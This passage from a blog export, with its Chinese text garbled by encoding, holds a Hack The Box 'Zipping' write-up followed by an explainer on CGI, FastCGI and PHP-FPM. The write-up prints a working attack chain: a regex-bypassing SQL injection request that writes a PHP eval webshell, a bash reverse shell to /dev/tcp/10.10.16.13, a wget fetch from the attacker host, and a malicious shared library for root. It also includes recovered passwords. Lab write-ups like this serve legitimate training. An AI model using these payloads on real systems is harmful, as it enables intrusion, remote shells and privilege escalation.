extension.&lt;/p&gt;&quot;; } } } else { echo &quot;Error uploading file.&quot;; } } } ?&gt; ä»£ç å®¡è®¡+sqlå››ä¸ªæ–‡ä»¶åŸºæœ¬å­˜åœ¨æ¼æ´ç‚¹çš„åœ°æ–¹å°±æ˜¯åœ¨cart.phpçš„sqlæŸ¥è¯¢ä¸­ 1234567if(preg_match(&quot;/^.*[A-Za-z!#$%^&amp;*()\\-_=+{}\\[\\]\\\\|;:'\\&quot;,.&lt;&gt;\\/?]|[^0-9]$/&quot;, $product_id, $match) || preg_match(&quot;/^.*[A-Za-z!#$%^&amp;*()\\-_=+{}[\\]\\\\|;:'\\&quot;,.&lt;&gt;\\/?]/i&quot;, $quantity, $match)) { echo ''; } else { // Construct the SQL statement with a vulnerable parameter $sql = &quot;SELECT * FROM products WHERE id = '&quot; . $_POST['product_id'] . &quot;'&quot;; // Execute the SQL statement without any sanitization or parameter binding $product = $pdo-&gt;query($sql)-&gt;fetch(PDO::FETCH_ASSOC); è¦æƒ³åŠæ³•ç»•è¿‡&quot;/^.*[A-Za-z!#$%^&amp;*()\\-_=+{}\\[\\]\\\\|;:'\\&quot;,.&lt;&gt;\\/?]|[^0-9]$/&quot;;è¿™ä¸ªæ­£åˆ™åŒ¹é…å°±æ˜¯ï¼šå¦‚æœä½ æ˜¯ä»¥A-Za-z!#$%^&amp;*()\\-_=+{}\\[\\]\\\\|;:'\\&quot;,.&lt;&gt;\\/?è¿™å…¶ä¸­çš„å­—ç¬¦å¼€å¤´æˆ–è€…ä»¥ä¸€ä¸ªéæ•°å­—ç»“å°¾çš„è¯å°±ä¼šåŒ¹é…æˆåŠŸ ^ï¼šåŒ¹é…è¾“å…¥çš„å¼€å§‹ä½ç½®ã€‚ .*ï¼šåŒ¹é…ä»»æ„å­—ç¬¦ï¼ˆé™¤æ¢è¡Œç¬¦ä¹‹å¤–ï¼‰é›¶æ¬¡æˆ–å¤šæ¬¡ã€‚ [A-Za-z!#$%^&amp;*()-_=+{}[]\\|;:â€™â€,.&lt;&gt;/?]ï¼šåŒ¹é…ä»»æ„ä¸€ä¸ªå­—æ¯æˆ–ç‰¹æ®Šå­—ç¬¦ã€‚ |ï¼šè¡¨ç¤ºæˆ–è€…çš„æ„æ€ã€‚ [^0-9]ï¼šåŒ¹é…é™¤æ•°å­—ä¹‹å¤–çš„ä»»æ„å­—ç¬¦ã€‚ $ï¼šåŒ¹é…è¾“å…¥çš„ç»“æŸä½ç½®ã€‚ æˆ‘ä»¬è¿™é‡Œå°±æ˜¯åˆ©ç”¨äº†.*ä¸åŒ¹é…\\nçš„ç‰¹æ€§æ¥ç»•è¿‡æ­£åˆ™åŒ¹é…çš„ å¹¶ä¸”$pdo-&gt;query($sql)-&gt;fetch(PDO::FETCH_ASSOC);å­˜åœ¨å †å æ³¨å…¥ webshellç°åœ¨æ€è·¯æ¯”è¾ƒæ¸…æ¥šäº†ï¼Œåˆ©ç”¨sqlæ³¨å…¥ into outfileä¸Šä¼ æœ¨é©¬ï¼Œå†æ–‡ä»¶åŒ…å«æœ¨é©¬ï¼›ä¸ºä»€ä¹ˆè¦åŒ…å«ï¼Ÿç›´æ¥æŠŠğŸæ”¾åœ¨/var/www/html/ä¸‹ï¼Œåœ¨è®¿é—®ä¸å°±å¯ä»¥äº†å—ï¼Ÿç¡®å®ï¼Œæƒ³çš„å¾ˆç¾å¥½ï¼›ä½†æ˜¯åœ¨ä¸Šé©¬çš„è¿‡ç¨‹ä¸­ä¼šå‘ç°/var/www/html/ä¸€ç›´ä¸æˆåŠŸï¼ŒçŒœæµ‹æ˜¯æ²¡æœ‰æƒé™ï¼Œåªèƒ½å°†ğŸæ”¾åœ¨å…¶ä»–æœ‰æƒé™çš„åœ°æ–¹ï¼Œå†åŒ…å«åˆ©ç”¨ã€‚ 1%0a'; select '&lt;?php phpinfo();eval($_REQUEST[1]);?&gt;' into outfile '/var/lib/mysql/shell.php'; --1 123456789101112131415POST /shop/index.php?page=cart HTTP/1.1Host: 10.10.11.229User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflate, brContent-Type: application/x-www-form-urlencodedContent-Length: 163Origin: http://10.10.11.229Connection: closeReferer: http://10.10.11.229/shop/index.php?page=product&amp;id=1Cookie: PHPSESSID=7c043nqbhm56rmfbgitd4vestcUpgrade-Insecure-Requests: 1quantity=1&amp;product_id=%0a'%3B%20select%20'%3C%3Fphp%20phpinfo()%3Beval(%24_REQUEST%5B1%5D)%3B%3F%3E'%20into%20outfile%20'%2Fvar%2Flib%2Fmysql%2Fshell.php'%3B%20--1 å†åå¼¹webshell,æˆåŠŸæ‹¿åˆ°rektsuç”¨æˆ· 1234&quot;/bin/bash -c '/bin/bash -i &gt;&amp; /dev/tcp/10.10.16.13/5555 0&gt;&amp;1'&quot;%22%2Fbin%2Fbash%20-c%20'%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.16.13%2F5555%200%3E%261'%22POST:1=system(%22%2Fbin%2Fbash%20-c%20'%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.16.13%2F5555%200%3E%261'%22); æˆåŠŸæ‹¿åˆ°shellï¼Œæˆ‘ä»¬å†å›å»çœ‹ä¸€ä¸‹ä¹‹å‰æ²¡æœ‰ä¸Šä¼ æˆåŠŸæ˜¯ä¸æ˜¯æ²¡æœ‰æƒé™å¯¼è‡´çš„ï¼› 12345678rektsu@zipping:/var/www$ ls -l /var/wwwdrwxr-xr-x 5 root rektsu 4096 Sep 5 14:25 htmlrektsu@zipping:/var/www$ ls /var/www/html -ldrwxrwxr-x 3 root rektsu 4096 Dec 13 02:46 shoprektsu@zipping:/var/www$ ls -l /var/libdrwxr-xr-x 6 mysql mysql 4096 Dec 13 02:51 mysql è¿™é‡Œæœ‰å°±æœ‰ç‚¹æ‡µé€¼äº†ï¼Œä¸ºä»€ä¹ˆ/var/www/html/shopæœ‰æƒé™å´æ²¡æœ‰ä¸Šä¼ æˆåŠŸ;/var/lib/mysqlæ²¡æœ‰æƒé™å´æˆåŠŸäº†ï¼Œå¥‡æ€ªï¼› åæ¥åˆæƒ³äº†ä¸€ä¸‹æ˜¯sqlå¯¹å†™å…¥æ–‡ä»¶çš„ç›®å½•æœ‰é™åˆ¶ åœ¨MySQLä¸­ï¼Œsecure_file_privå˜é‡ç”¨äºé™åˆ¶INTO OUTFILEè¯­å¥å†™å…¥æ–‡ä»¶çš„ç›®å½•ã€‚å¦‚æœè¯¥å˜é‡æ²¡æœ‰è®¾ç½®æˆ–è€…è®¾ç½®ä¸ºç©ºï¼Œé‚£ä¹ˆMySQLæœåŠ¡å™¨å°†ä½¿ç”¨é»˜è®¤çš„æ•°æ®ç›®å½•æ¥ä¿å­˜æ–‡ä»¶ã€‚ ç™»é™†æ•°æ®åº“çœ‹ä¸€ä¸‹ï¼›æœç„¶å’Œæˆ‘çŒœæƒ³çš„ä¸€æ ·ï¼›ä¸ºç©ºï¼Œä½¿ç”¨é»˜è®¤çš„æ•°æ®ç›®å½•æ¥ä¿å­˜æ–‡ä»¶ 12345678mysql -h localhost -u root -pMySQL_P@ssw0rd!SHOW VARIABLES LIKE 'secure_file_priv';+------------------+-------+| Variable_name | Value |+------------------+-------+| secure_file_priv | |+------------------+-------+ ææƒsudo -lå‘ç°å¯ä»¥è¿è¡Œä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶/usr/bin/stockï¼› 12345678rektsu@zipping:/var/www$ sudo -lsudo -lMatching Defaults entries for rektsu on zipping: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser rektsu may run the following commands on zipping: (ALL) NOPASSWD: /usr/bin/stock å°†/usr/bin/stockæ–‡ä»¶ä¸‹è½½åˆ°æœ¬åœ°gdbè°ƒè¯•ï¼› è¿™é‡Œè¦æˆ‘ä»¬è¾“å…¥å¯†ç ï¼Œæˆ‘ä»¬ä¸çŸ¥é“ï¼Œå…ˆè¾“å…¥åƒåœ¾å­—ç¬¦ è¿™ä¸ªå­˜åœ¨ä¸€ä¸ªcheckAuth,åº”è¯¥æ˜¯éªŒè¯å¯†ç çš„å‡½æ•°ï¼ŒæŒ‰sè·Ÿè¿›çœ‹ä¸€ä¸‹è¿™ä¸ªå‡½æ•°åœ¨å¹²å˜› å¯ä»¥çœ‹åˆ°å°†æˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦ä¸St0ckM4nagerä½œæ¯”è¾ƒï¼›è¯´æ˜St0ckM4nagerå°±æ˜¯password ç¬¬äºŒæ¬¡è°ƒè¯•ï¼šè¾“å…¥æ­£ç¡®çš„å¯†ç ï¼Œçœ‹çœ‹ä¸‹é¢ä¼šæ‰§è¡Œä»€ä¹ˆ è¿™é‡Œè°ƒç”¨äº†dlopenå‡½æ•°å¹¶ä¸”æ–‡ä»¶åæ˜¯/home/rektsu/.config/libcounter.so åœ¨Cè¯­è¨€ä¸­ï¼Œdlopenå‡½æ•°ç”¨äºåŠ¨æ€åŠ è½½å…±äº«åº“ï¼ˆä¹Ÿç§°ä¸ºåŠ¨æ€é“¾æ¥åº“ï¼‰å¹¶è¿”å›ä¸€ä¸ªå¥æŸ„ï¼Œä»¥ä¾¿åœ¨è¿è¡Œæ—¶ä½¿ç”¨åº“ä¸­çš„å‡½æ•°å’Œç¬¦å·ã€‚ ä¸€ä¸‹å°±æƒ³åˆ°LD-PRELOADåŠ«æŒsoæ–‡ä»¶åˆ°è¾¾ææƒçš„ç›®çš„ã€‚ls -l /home/rektsu/.config/libcounter.so å¹¶æ²¡æœ‰è¿™ä¸ªæ–‡ä»¶ã€‚éœ€è¦æˆ‘ä»¬å†æœ¬åœ°åˆ¶ä½œæ¶æ„çš„åŠ¨æ€é“¾æ¥åº“ï¼› 1234#include &lt;stdlib.h&gt;void _init() { system(&quot;/bin/bash&quot;);} ç”Ÿæˆæ¶æ„åŠ¨æ€é“¾æ¥åº“ï¼šgcc hack.c -fPIC -shared -o libcounter.so -nostartfiles 123456wget 10.10.16.13:8000/libcounter.sosudo /usr/bin/stockSt0ckM4nageriduid=0(root) gid=0(root) groups=0(root) æ€»ç»“nmapæœé›†åˆ°80ç«¯å£å¼€æ”¾ï¼›dirsearchæœé›†/upload.php,/shop;å…¶ä¸­/shop/index?page=å­˜åœ¨åŒ…å«ä»»æ„phpæ–‡ä»¶æ¼æ´ï¼›/upload.phpå­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–ï¼Œè¯»å–åˆ°/var/www/html/shop/cart.phpå‘ç°å­˜åœ¨sqlæ³¨å…¥ï¼›å¯ä»¥åˆ©ç”¨into outfileæ³¨å…¥ğŸï¼›å†åˆ©ç”¨æ–‡ä»¶åŒ…å«ğŸï¼›åå¼¹shellå¾—åˆ°rektsuç”¨æˆ·ï¼›sudo -lå‘ç°sudoè¿è¡Œ/usr/bin/stockæ–‡ä»¶ï¼Œä¸‹è½½åˆ°æœ¬åœ°è°ƒè¯•ï¼Œå‘ç°stockåŠ è½½äº†åŠ¨æ€é“¾æ¥åº“/home/rektsu/.config/libcounter.so;åŠ«æŒåŠ¨æ€é“¾æ¥åº“æ¥ææƒã€‚","link":"/2023/12/13/Zipping(HTB)/"},{"title":"cgiï¼Œphp-cgiï¼Œfastcgi ã€php-fpmä¹‹é—´çš„å…³ç³»","text":"å‰è¨€åœ¨åšä¸€é“ssrfé¢˜ç›®æ—¶ï¼Œæåˆ°äº†æœ‰å…³äºFastCGIã€PHP-FPMï¼Œä¸çŸ¥é“æ˜¯ä»€ä¹ˆä¸œä¸œ å¼•å‡ºæ¦‚å¿µåœ¨æ•´ä¸ªç½‘ç«™æ¶æ„ä¸­ï¼ŒWeb Serverï¼ˆå¦‚Apacheã€Nginxï¼‰åªæ˜¯å†…å®¹çš„åˆ†å‘è€…ã€‚ä¸¾ä¸ªæ —å­ï¼Œå¦‚æœå®¢æˆ·ç«¯è¯·æ±‚çš„æ˜¯ index.htmlï¼Œé‚£ä¹ˆWeb Serverä¼šå»æ–‡ä»¶ç³»ç»Ÿä¸­æ‰¾åˆ°è¿™ä¸ªæ–‡ä»¶ï¼Œå‘é€ç»™æµè§ˆå™¨ï¼Œè¿™é‡Œåˆ†å‘çš„æ˜¯é™æ€æ•°æ®ã€‚ å¦‚æœè¯·æ±‚çš„æ˜¯ index.phpï¼Œæ ¹æ®é…ç½®æ–‡ä»¶ï¼ŒWeb ServerçŸ¥é“è¿™ä¸ªä¸æ˜¯é™æ€æ–‡ä»¶ï¼Œéœ€è¦å»æ‰¾ PHP è§£æå™¨æ¥å¤„ç†ï¼Œé‚£ä¹ˆä»–ä¼šæŠŠè¿™ä¸ªè¯·æ±‚ç®€å•å¤„ç†ï¼Œç„¶åäº¤ç»™PHPè§£æå™¨ã€‚ å½“Web Serveræ”¶åˆ°index.php è¿™ä¸ªè¯·æ±‚åï¼Œä¼šå¯åŠ¨å¯¹åº”çš„ CGI ç¨‹åºï¼Œè¿™é‡Œå°±æ˜¯PHPçš„è§£æå™¨ã€‚æ¥ä¸‹æ¥PHPè§£æå™¨ä¼šè§£æphp.iniæ–‡ä»¶ï¼Œåˆå§‹åŒ–æ‰§è¡Œç¯å¢ƒï¼Œç„¶åå¤„ç†è¯·æ±‚ï¼Œå†ä»¥è§„å®šCGIè§„å®šçš„æ ¼å¼è¿”å›å¤„ç†åçš„ç»“æœï¼Œé€€å‡ºè¿›ç¨‹ï¼ŒWeb serverå†æŠŠç»“æœè¿”å›ç»™æµè§ˆå™¨ã€‚è¿™å°±æ˜¯ä¸€ä¸ªå®Œæ•´çš„åŠ¨æ€PHP Webè®¿é—®æµç¨‹ï¼Œæ¥ä¸‹æ¥å†å¼•å‡ºè¿™äº›æ¦‚å¿µï¼Œä¼šå¥½ç†è§£å¾ˆå¤šã€‚ CGIï¼šæ˜¯ Web Server ä¸ Web Application ä¹‹é—´æ•°æ®äº¤æ¢çš„ä¸€ç§åè®®ã€‚ FastCGIï¼šåŒ CGIï¼Œæ˜¯ä¸€ç§é€šä¿¡åè®®ï¼Œä½†æ¯” CGI åœ¨æ•ˆç‡ä¸Šåšäº†ä¸€äº›ä¼˜åŒ–ã€‚ PHP-CGIï¼šæ˜¯ PHP ï¼ˆWeb Applicationï¼‰å¯¹ Web Server æä¾›çš„ CGI åè®®çš„æ¥å£ç¨‹åºã€‚ PHP-FPMï¼šæ˜¯ PHPï¼ˆWeb Applicationï¼‰å¯¹ Web Server æä¾›çš„ FastCGI åè®®çš„æ¥å£ç¨‹åºï¼Œé¢å¤–è¿˜æä¾›äº†ç›¸å¯¹æ™ºèƒ½ä¸€äº›ä»»åŠ¡ç®¡ç†ã€‚ ï¼ˆWeb Server ä¸€èˆ¬æŒ‡Apacheã€Nginxã€IISã€Tomcatç­‰æœåŠ¡å™¨ï¼ŒWeb Application ä¸€èˆ¬æŒ‡PHPã€Javaã€Asp.netç­‰åº”ç”¨ç¨‹åºï¼‰ æ¦‚å¿µ1ã€CGICGIï¼ˆCommon Gateway Interfaceï¼‰å…¨ç§°æ˜¯â€œé€šç”¨ç½‘å…³æ¥å£â€ï¼ŒWEB æœåŠ¡å™¨ä¸PHPåº”ç”¨è¿›è¡Œâ€œäº¤è°ˆâ€çš„ä¸€ç§å·¥å…·ï¼Œå…¶ç¨‹åºé¡»è¿è¡Œåœ¨ç½‘ç»œæœåŠ¡å™¨ä¸Šã€‚CGIå¯ä»¥ç”¨ä»»ä½•ä¸€ç§è¯­è¨€ç¼–å†™ï¼Œåªè¦è¿™ç§è¯­è¨€å…·æœ‰æ ‡å‡†è¾“å…¥ã€è¾“å‡ºå’Œç¯å¢ƒå˜é‡ã€‚å¦‚phpã€perlã€tclç­‰ã€‚ WEBæœåŠ¡å™¨ä¼šä¼ å“ªäº›æ•°æ®ç»™PHPè§£æå™¨å‘¢ï¼ŸURLã€æŸ¥è¯¢å­—ç¬¦ä¸²ã€POSTæ•°æ®ã€HTTP headeréƒ½ä¼šæœ‰ã€‚æ‰€ä»¥ï¼ŒCGIå°±æ˜¯è§„å®šè¦ä¼ å“ªäº›æ•°æ®ï¼Œä»¥ä»€ä¹ˆæ ·çš„æ ¼å¼ä¼ é€’ç»™åæ–¹å¤„ç†è¿™ä¸ªè¯·æ±‚çš„åè®®ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼ŒCGIå°±æ˜¯ä¸“é—¨ç”¨æ¥å’Œ web æœåŠ¡å™¨æ‰“äº¤é“çš„ã€‚webæœåŠ¡å™¨æ”¶åˆ°ç”¨æˆ·è¯·æ±‚ï¼Œå°±ä¼šæŠŠè¯·æ±‚æäº¤ç»™cgiç¨‹åºï¼ˆå¦‚php-cgiï¼‰ï¼Œcgiç¨‹åºæ ¹æ®è¯·æ±‚æäº¤çš„å‚æ•°ä½œåº”å¤„ç†ï¼ˆè§£æphpï¼‰ï¼Œç„¶åè¾“å‡ºæ ‡å‡†çš„htmlè¯­å¥ï¼Œè¿”å›ç»™webæœæœåŠ¡å™¨ï¼ŒWEBæœåŠ¡å™¨å†è¿”å›ç»™å®¢æˆ·ç«¯ï¼Œè¿™å°±æ˜¯æ™®é€šcgiçš„å·¥ä½œåŸç†ã€‚ï¼ˆcgiç¨‹åºï¼Œä½ å°±å¯ä»¥ç†è§£æˆéµå¾ªcgiåè®®ç¼–å†™çš„ç¨‹åºï¼‰ ä¼˜ç‚¹ï¼š CGIçš„å¥½å¤„å°±æ˜¯å®Œå…¨ç‹¬ç«‹äºä»»ä½•æœåŠ¡å™¨ï¼Œä»…ä»…æ˜¯åšä¸ºä¸­é—´åˆ†å­ã€‚æä¾›æ¥å£ç»™webæœåŠ¡å™¨å’Œwebåº”ç”¨(å¦‚ænginxå’Œphp)ã€‚ä»–ä»¬é€šè¿‡cgiæ­çº¿æ¥å®Œæˆæ•°æ®ä¼ é€’ã€‚è¿™æ ·åšçš„å¥½å¤„äº†å°½é‡å‡å°‘2ä¸ªçš„å…³è”ï¼Œä½¿ä»–ä»¬2å˜å¾—æ›´ç‹¬ç«‹ã€‚ ç¼ºç‚¹ï¼š ä½†æ˜¯CGIæœ‰ä¸ªéš¾å—çš„åœ°æ–¹ï¼Œå°±æ˜¯æ¯ä¸€æ¬¡webè¯·æ±‚éƒ½ä¼šæœ‰å¯åŠ¨å’Œé€€å‡ºè¿‡ç¨‹ï¼Œä¹Ÿå°±æ˜¯æœ€ä¸ºäººè¯Ÿç—…çš„fork-and-executeæ¨¡å¼ï¼Œè¿™æ ·ä¸€åœ¨å¤§è§„æ¨¡å¹¶å‘ä¸‹ï¼Œå°±æ­»ç¿˜ç¿˜äº†ã€‚ 2ã€FastCGIä»æ ¹æœ¬ä¸Šæ¥è¯´ï¼ŒFastCGIæ˜¯ç”¨æ¥æé«˜CGIç¨‹åºæ€§èƒ½çš„ã€‚ç±»ä¼¼äºCGIï¼ŒFastCGIä¹Ÿå¯ä»¥è¯´æ˜¯ä¸€ç§åè®®ã€‚ FastCGIåƒæ˜¯ä¸€ä¸ªå¸¸é©»(long-live)å‹çš„CGIï¼Œå®ƒå¯ä»¥ä¸€ç›´æ‰§è¡Œç€ï¼Œåªè¦æ¿€æ´»åï¼Œä¸ä¼šæ¯æ¬¡éƒ½è¦èŠ±è´¹æ—¶é—´å»forkä¸€æ¬¡ã€‚ FastCGIæ˜¯å’Œè¯­è¨€æ— å…³çš„ã€å¯ä¼¸ç¼©æ¶æ„çš„CGIå¼€æ”¾æ‰©å±•ï¼Œå…¶ä¸»è¦è¡Œä¸ºæ˜¯å°†CGIè§£é‡Šå™¨è¿›ç¨‹ä¿æŒåœ¨å†…å­˜ä¸­ï¼Œå¹¶å› æ­¤è·å¾—è¾ƒé«˜çš„æ€§èƒ½ã€‚ä¼—æ‰€å‘¨çŸ¥ï¼ŒCGIè§£é‡Šå™¨çš„åå¤åŠ è½½æ˜¯CGIæ€§èƒ½ä½ä¸‹çš„ä¸»è¦åŸå› ï¼Œå¦‚æœCGIè§£é‡Šå™¨ä¿æŒåœ¨å†…å­˜ä¸­ï¼Œå¹¶æ¥å—FastCGIè¿›ç¨‹ç®¡ç†å™¨è°ƒåº¦ï¼Œåˆ™å¯ä»¥æä¾›è‰¯å¥½çš„æ€§èƒ½ã€ä¼¸ç¼©æ€§ã€Fail- Overç‰¹æ€§ç­‰ç­‰ã€‚ ä¸¾ä¾‹ï¼š å½“web serveræ”¶åˆ°/index.phpè¯·æ±‚ï¼Œçœ‹ä¸€ä¸‹CGIç¨‹åºå’ŒFastCGIç¨‹åºåˆ†åˆ«æ˜¯æ€ä¹ˆå¤„ç†çš„ï¼š CGIï¼šå½“æ”¶åˆ°web serverè¯·æ±‚åï¼Œä¼šå¯åŠ¨å¯¹åº”çš„CGIç¨‹åºï¼Œè¿™é‡Œå°±æ˜¯PHPçš„è§£æå™¨ï¼ˆphp-cgiï¼‰ã€‚æ¥ä¸‹æ¥PHPè§£æå™¨ä¼šè§£æphp.iniæ–‡ä»¶ï¼Œåˆå§‹åŒ–æ‰§è¡Œç¯å¢ƒï¼Œç„¶åå¤„ç†è¯·æ±‚ï¼Œå†ä»¥è§„å®šçš„CGIè§„å®šçš„æ ¼å¼è¿”å›å¤„ç†åçš„ç»“æœï¼Œé€€å‡ºè¿›ç¨‹ã€‚ï¼ˆCGIæ¯æ¬¡æ¥æ”¶åˆ°è¯·æ±‚éƒ½ä¼šæ‰§è¡Œè¿™äº›æ­¥éª¤ï¼‰ FastCGIï¼šé¦–å…ˆï¼ŒFastCGIç¨‹åºä¼šå…ˆå¯åŠ¨ä¸€ä¸ªmasterï¼Œè§£æé…ç½®ç¯å¢ƒï¼Œåˆå§‹åŒ–æ‰§è¡Œç¯å¢ƒï¼Œç„¶åå†å¯åŠ¨å¤šä¸ªworkerã€‚å½“è¯·æ±‚è¿‡æ¥æ—¶ï¼Œmasterä¼šä¼ é€’ç»™ä¸€ä¸ªworkerï¼Œç„¶åç«‹å³å¯ä»¥æ¥å—ä¸‹ä¸€ä¸ªè¯·æ±‚ã€‚è¿™æ ·å°±é¿å…äº†é‡å¤çš„åŠ³åŠ¨ï¼Œæ•ˆç‡è‡ªç„¶æ˜¯é«˜ã€‚è€Œä¸”å½“workerä¸å¤Ÿç”¨æ—¶ï¼Œmasterå¯ä»¥æ ¹æ®é…ç½®é¢„å…ˆå¯åŠ¨å‡ ä¸ªworkerç­‰ç€ï¼›å½“ç„¶ç©ºé—²workerå¤ªå¤šæ—¶ï¼Œä¹Ÿä¼šåœæ‰ä¸€äº›ï¼Œè¿™æ ·å°±æé«˜äº†æ€§èƒ½ï¼Œä¹ŸèŠ‚çº¦äº†èµ„æºï¼Œè¿™å°±æ˜¯fastcgiå¯¹è¿›ç¨‹çš„ç®¡ç†ã€‚ï¼ˆCGIç¨‹åºå’ŒFastCGIç¨‹åºï¼Œå¯ä»¥ç†è§£æˆéµå¾ªCGIåè®®å’ŒFastCGIåè®®ç¼–å†™çš„ç¨‹åºï¼‰ FastCGIçš„å·¥ä½œåŸç†ï¼š FastCGIæ¥å£æ–¹å¼é‡‡ç”¨C/Sç»“æ„ï¼Œå¯ä»¥å°†HTTPæœåŠ¡å™¨å’Œè„šæœ¬è§£ææœåŠ¡å™¨åˆ†å¼€ï¼ŒåŒæ—¶åœ¨è„šæœ¬è§£ææœåŠ¡å™¨ä¸Šå¯åŠ¨ä¸€ä¸ªæˆ–è€…å¤šä¸ªè„šæœ¬è§£æå®ˆæŠ¤è¿›ç¨‹ã€‚å½“HTTPæœåŠ¡å™¨æ¯æ¬¡é‡åˆ°åŠ¨æ€ç¨‹åºæ—¶ï¼Œå¯ä»¥å°†å…¶ç›´æ¥äº¤ä»˜ç»™FastCGIè¿›ç¨‹æ¥æ‰§è¡Œï¼Œç„¶åå°†å¾—åˆ°çš„ç»“æœè¿”å›ç»™æµè§ˆå™¨ã€‚è¿™ç§æ–¹å¼å¯ä»¥è®©HTTPæœåŠ¡å™¨ä¸“ä¸€åœ°å¤„ç†é™æ€è¯·æ±‚ï¼Œæˆ–è€…å°†åŠ¨æ€è„šæœ¬æœåŠ¡å™¨çš„ç»“æœè¿”å›ç»™å®¢æˆ·ç«¯ï¼Œè¿™åœ¨å¾ˆå¤§ç¨‹åº¦ä¸Šæé«˜äº†æ•´ä¸ªåº”ç”¨ç³»ç»Ÿçš„æ€§èƒ½ã€‚ ï¼ˆ1ï¼‰Web Serverå¯åŠ¨æ—¶è½½å…¥FastCGIè¿›ç¨‹ç®¡ç†å™¨ï¼ˆApache Moduleæˆ–IIS ISAPIç­‰) ï¼ˆ2ï¼‰FastCGIè¿›ç¨‹ç®¡ç†å™¨è‡ªèº«åˆå§‹åŒ–ï¼Œå¯åŠ¨å¤šä¸ªCGIè§£é‡Šå™¨è¿›ç¨‹(å¯å»ºå¤šä¸ªphp-cgi)ï¼Œå¹¶ç­‰å¾…æ¥è‡ªWeb Serverçš„è¿æ¥ã€‚ ï¼ˆ3ï¼‰å½“å®¢æˆ·ç«¯è¯·æ±‚åˆ°è¾¾Web Serveræ—¶ï¼ŒFastCGIè¿›ç¨‹ç®¡ç†å™¨é€‰æ‹©å¹¶è¿æ¥åˆ°ä¸€ä¸ªCGIè§£é‡Šå™¨ã€‚Web serverå°†CGIç¯å¢ƒå˜é‡å’Œæ ‡å‡†è¾“å…¥å‘é€åˆ°FastCGIå­è¿›ç¨‹php-cgiã€‚ ï¼ˆ4ï¼‰FastCGIå­è¿›ç¨‹å®Œæˆå¤„ç†åï¼Œå°†æ ‡å‡†è¾“å‡ºå’Œé”™è¯¯ä¿¡æ¯ä»åŒä¸€è¿æ¥è¿”å›Web Serverã€‚å½“FastCGIå­è¿›ç¨‹å…³é—­è¿æ¥æ—¶ï¼Œè¯·æ±‚ä¾¿å‘Šå¤„ç†å®Œæˆã€‚FastCGIå­è¿›ç¨‹æ¥ç€ç­‰å¾…ï¼Œå¹¶å¤„ç†æ¥è‡ªFastCGIè¿›ç¨‹ç®¡ç†å™¨(è¿è¡Œåœ¨Web Serverä¸­)çš„ä¸‹ä¸€ä¸ªè¿æ¥ã€‚åœ¨CGIæ¨¡å¼ä¸­ï¼Œphp-cgiåœ¨æ­¤ä¾¿é€€å‡ºäº†ã€‚ CGIä¸FastCGIæ¯”è¾ƒï¼š ï¼ˆ1ï¼‰å¯¹äºCGIæ¥è¯´ï¼Œæ¯ä¸€ä¸ªWebè¯·æ±‚PHPéƒ½å¿…é¡»é‡æ–°è§£æphp.iniã€é‡æ–°è½½å…¥å…¨éƒ¨æ‰©å±•ï¼Œå¹¶é‡æ–°åˆå§‹åŒ–å…¨éƒ¨æ•°æ®ç»“æ„ã€‚è€Œä½¿ç”¨FastCGIï¼Œæ‰€æœ‰è¿™äº›éƒ½åªåœ¨è¿›ç¨‹å¯åŠ¨æ—¶å‘ç”Ÿä¸€æ¬¡ã€‚ä¸€ä¸ªé¢å¤–çš„å¥½å¤„æ˜¯ï¼ŒæŒç»­æ•°æ®åº“è¿æ¥(Persistent database connection)å¯ä»¥å·¥ä½œã€‚ ï¼ˆ2ï¼‰ç”±äºFastCGIæ˜¯å¤šè¿›ç¨‹ï¼Œæ‰€ä»¥æ¯”CGIå¤šçº¿ç¨‹æ¶ˆè€—æ›´å¤šçš„æœåŠ¡å™¨å†…å­˜ï¼Œphp-cgiè§£é‡Šå™¨æ¯è¿›ç¨‹æ¶ˆè€—7è‡³25å…†å†…å­˜ï¼Œå°†è¿™ä¸ªæ•°å­—ä¹˜ä»¥50æˆ–100å°±æ˜¯å¾ˆå¤§çš„å†…å­˜æ•°ã€‚ 3ã€PHP-FPMé¦–å…ˆè¦è¯´çš„æ˜¯ï¼šfastcgiæ˜¯ä¸€ä¸ªåè®®ï¼Œphp-fpmå®ç°äº†è¿™ä¸ªåè®®ã€‚ å¤§å®¶éƒ½çŸ¥é“ï¼ŒPHPçš„è§£é‡Šå™¨æ˜¯php-cgiã€‚php-cgiåªæ˜¯ä¸ªCGIç¨‹åºï¼Œä»–è‡ªå·±æœ¬èº«åªèƒ½è§£æè¯·æ±‚ï¼Œè¿”å›ç»“æœï¼Œä¸ä¼šè¿›ç¨‹ç®¡ç†ï¼Œæ‰€ä»¥å°±å‡ºç°äº†ä¸€äº›èƒ½å¤Ÿè°ƒåº¦php-cgiè¿›ç¨‹çš„ç¨‹åºï¼Œphp-fpmå°±æ˜¯è¿™æ ·çš„ä¸€ä¸ªä¸œè¥¿ã€‚å®ƒå…‹æœäº†php-cgiå˜æ›´php.inié…ç½®åï¼Œéœ€é‡å¯php-cgiæ‰èƒ½è®©æ–°çš„php-iniç”Ÿæ•ˆï¼Œä¸å¯ä»¥å¹³æ»‘é‡å¯ï¼Œç›´æ¥æ€æ­»php-cgiè¿›ç¨‹ï¼Œphpå°±ä¸èƒ½è¿è¡Œäº†çš„é—®é¢˜ã€‚ä¿®æ”¹php.iniä¹‹åï¼Œphp-cgiè¿›ç¨‹çš„ç¡®æ²¡åŠæ³•å¹³æ»‘é‡å¯çš„ã€‚php-fpmå¯¹æ­¤çš„å¤„ç†æœºåˆ¶æ˜¯æ–°çš„workerç”¨æ–°çš„é…ç½®ï¼Œå·²ç»å­˜åœ¨çš„workerå¤„ç†å®Œæ‰‹ä¸Šçš„æ´»å°±å¯ä»¥æ­‡ç€äº†ï¼Œé€šè¿‡è¿™ç§æœºåˆ¶æ¥å¹³æ»‘è¿‡åº¦ã€‚ 